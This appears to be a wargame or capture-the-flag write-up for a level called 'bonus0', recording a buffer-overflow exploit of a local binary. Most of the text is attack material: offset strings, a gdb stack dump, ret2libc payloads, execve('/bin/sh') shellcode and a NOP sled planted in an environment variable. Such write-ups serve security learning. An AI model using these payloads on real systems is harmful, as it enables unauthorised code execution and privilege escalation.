# bonus0

## Useful infos

max string we can write: `AAAABBBBCCCCDDDDEEEE1111222233334444555 1111222233334444555`

first string: `AAAABBBBCCCCDDDDEEEE`
second string `1111222233334444555`
segfaults on call to `0x34333333` -> `111122223[3334]444555`

### ret2libc try

address of system: `0xb7e6b060` -> `\x60\xb0\xe6\xb7`
address of "/bin/sh": `0xb7f8cc58` -> `\x58\xcc\xf8\xb7`

exploit: `echo -e "111122223\x60\xb0\xe6\xb74445555"`
exploit: `echo -e "\x59\xcc\xf8\xb7\x59\xcc\xf8\xb73\x60\xb0\xe6\xb7444555"`
exploit: `echo -e "\x59\xcc\xf8\xb7\x59\xcc\xf8\xb7\x59\xcc\xf8\xb7\x59\xcc\xf8\xb7\x59\xcc\xf8\xb7"`

(gdb) x/100xw $esp
0xbffffdf0:	[0xbffffe06	0x080498d8	0x00000001	0x0804835d
0xbffffe00:	0xb7fd13e4	0x41410016	0x42424141	0x43434242
0xbffffe10:	0x44444343	0x45454444	0x31312045	0x32323131
0xbffffe20:	0x33333232	0x34343333	0x35353434	0xb7fd0035]
0xbffffe30:	0x080485d0	0x00000000	0x00000000	0xb7e454d3

Second try:  
exploit: `echo -e "AAAABBBBCCCCDDDDEEEE"`
exploit: `echo -e "11\x60\xb0\xe6\xb7\x58\xcc\xf8\xb7334444555"`
exploit: `echo -e "11\x58\xcc\xf8\xb7\x58\xcc\xf8\xb7\x58\xcc\xf8\xb7\x60\xb0\xe6\xb75"`


### shellcode

0xffffca50
0xffffca16
0xffffdd96
0xbffffe10 = `\x16\xfe\xff\xbf`

Shellcode:  
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

exploit:  
`echo -e "\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"`
`echo -e "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x16\xfe\xff\xbf5"`

with trap:
`echo -e "\x90\x90\x90\x90\x90\xcc\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"`
`echo -e "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x16\xfe\xff\xbf5"`

### shellcode in environment variable

middle of the nopslide: `0xbffff8b0`

Test:  
`EXPLOIT=$(echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc")`

exploit:  
str1: `echo AAAABBBBCCCCDDDDEEEE`
str2: `echo -e "11112222333344\xb0\xf8\xff\xbf5"`

`EXPLOIT=$(echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")`